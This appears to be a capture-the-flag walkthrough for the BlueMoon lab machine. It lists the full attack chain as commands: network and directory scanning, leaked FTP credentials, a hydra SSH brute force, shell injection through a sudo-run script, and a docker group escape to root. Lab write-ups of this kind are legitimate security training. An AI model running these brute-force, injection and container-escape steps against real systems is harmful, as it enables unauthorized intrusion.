# BlueMoon Penetration Testing Walkthrough

 ## Overview
  
 ### Complete exploitation guide for BlueMoon machine - from initial reconnaissance to root access.

  #### Phase 1: Reconnaissance
  
  Identify Attacker Machine

      iconfig

   Result: Attacker IP = 192.168.100.216

  <img width="705" height="335" alt="image" src="https://github.com/user-attachments/assets/c8944145-7af2-4686-bd85-a5c1c75b54c7" />

  #### Network Discovery

    nmap -sP 192.168.100.0/24

  <img width="738" height="198" alt="image" src="https://github.com/user-attachments/assets/fbd56173-fcfb-4248-b9ab-d19339a252e4" />

  #### Open Services Found:

  | Port | Service |
  |------|---------|  
  | 21   | ftp     |  
  | 22   | ssh     |  
  | 80   | http    |

 # Phase 2: Web Application Analysis

 ## **Initial HTTP Reconnaissance**

  Navigate to: http://192.168.100.215

  <img width="917" height="880" alt="image" src="https://github.com/user-attachments/assets/fd5c792e-2ae9-4a61-ad42-bca9c932b874" />

  ### Directory Enumeration

     gobuster dir -u http://192.168.100.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

<img width="882" height="363" alt="image" src="https://github.com/user-attachments/assets/116e8416-73e8-46d9-b735-e4b441b963ce" />

#### Discovery: /hidden_text directory located

## Hidden Content Exploration

Access: http://192.168.100.215/hidden_text

<img width="929" height="489" alt="image" src="https://github.com/user-attachments/assets/d5f6ee83-9389-4b1e-a4fd-651a8967769b" />

- Click "Thank you..." link
- QR code image downloads

<img width="933" height="790" alt="image" src="https://github.com/user-attachments/assets/3324cb3b-06ce-4347-8bc0-e78b4bd1f4cf" />

## QR Code Decoding

Upload QR code to: https://zxing.org/w/decode.jspx

<img width="849" height="588" alt="image" src="https://github.com/user-attachments/assets/0fd4ea83-70f0-4031-8684-4a9e2e404a37" />

#### Credentials Extracted:

    Username: userftp
    
    Password: ftpp@ssword


# Phase 3: FTP Access & File Extraction

## FTP Connection

    ftp 192.168.100.215

<img width="665" height="363" alt="image" src="https://github.com/user-attachments/assets/3a42e3df-235b-4bd4-b767-f4f7683f7fea" />

### Download Target Files

    ls
    
    get information.txt
    
    get p_lists.txt

<img width="932" height="234" alt="image" src="https://github.com/user-attachments/assets/aa06268b-fb98-43da-828d-564bcb27fa75" />

### Content Analysis

    cat information.txt
    cat p_lists.txt

<img width="942" height="704" alt="image" src="https://github.com/user-attachments/assets/1d0a9cab-4e1b-4edc-aba2-35154cae24d3" />

#### Findings:

- information.txt → Username revealed: robin

- p_lists.txt → SSH password wordlist obtained


# Phase 4: SSH Brute Force

## Hydra Attack

    hydra -l robin -P p_lists.txt ssh://192.168.100.215

<img width="933" height="254" alt="image" src="https://github.com/user-attachments/assets/030b7920-28c8-43fb-97a5-aec944e15409" />

### Valid Credentials Discovered:

    Username: robin
    Password: k4rv3ndh4nh4ck3r

# Phase 5: Initial Shell Access

## SSH Login

    ssh robin@192.168.100.215

<img width="646" height="290" alt="image" src="https://github.com/user-attachments/assets/340a4091-8e8a-47fc-9591-7da055a946ae" />

### Enumeration

    ls -l
    cat user1.txt

<img width="471" height="182" alt="image" src="https://github.com/user-attachments/assets/5b83e30c-0b78-41b5-b2c2-ed2f5f35c6af" />

Flag 1 captured


# Phase 6: Lateral Privilege Escalation

## Check Sudo Permissions

    sudo -l

<img width="887" height="104" alt="image" src="https://github.com/user-attachments/assets/4ba81efb-7cc3-4e71-9cc2-1c720c003d61" />

## Explore Project Directory

    cd project
    ls
    cat feedback.sh

Finding: feedback.sh executable as user jerry

<img width="596" height="261" alt="image" src="https://github.com/user-attachments/assets/fc455837-3d12-41c7-8cb8-bd0a232d290f" />

## Script Exploitation

    sudo -u jerry /home/robin/project/feedback.sh

#### Script Interaction:

- Name prompt → Enter: jerry
- Feedback prompt → Enter: /bin/bash

## Verify Escalation

    ls
    pwd
    cd /home/jerry
    ls
    cat user2.txt

<img width="734" height="557" alt="image" src="https://github.com/user-attachments/assets/558b9056-0f58-42e4-960d-5e7419dc0682" />

 Flag 2 captured


 # Phase 7: Root Access via Docker

 ## Interactive Shell Upgrade

     python -c 'import pty; pty.spawn("/bin/bash")'

 ## Verify Privileges

     id

 ### Finding: User jerry belongs to docker group

 <img width="544" height="101" alt="image" src="https://github.com/user-attachments/assets/ee0728c0-69c7-4794-ac63-c42aecdab4f6" />

 ## List Docker Images

     docker image ls

 <img width="748" height="51" alt="image" src="https://github.com/user-attachments/assets/45b1d12a-c616-4cf1-b563-b1da319856ed" />

## Exploit Docker Alpine

    docker run -v /:/mnt --rm -it alpine chroot /mnt sh

## Root Confirmation

    id
    cd /root
    ls -al
    cat root.txt

<img width="956" height="647" alt="image" src="https://github.com/user-attachments/assets/bd7217f5-b130-425f-88c2-f41cb0bf7a56" />

 Root flag obtained! Machine fully compromised!


 # Summary

 ## Exploitation Chain:

- ✅ Discovered hidden directory via directory enumeration
- ✅ Extracted FTP credentials from QR code
- ✅ Retrieved password list and username from FTP
- ✅ Brute-forced SSH credentials
- ✅ Exploited bash injection in feedback script
- ✅ Leveraged docker group membership for root
- ✅ Obtained all flags and root shell

## Key Vulnerabilities:

- Weak credential storage (QR code on web)
- Insufficient input validation (script injection)
- Excessive docker group permissions
- Unprotected sensitive files via FTP


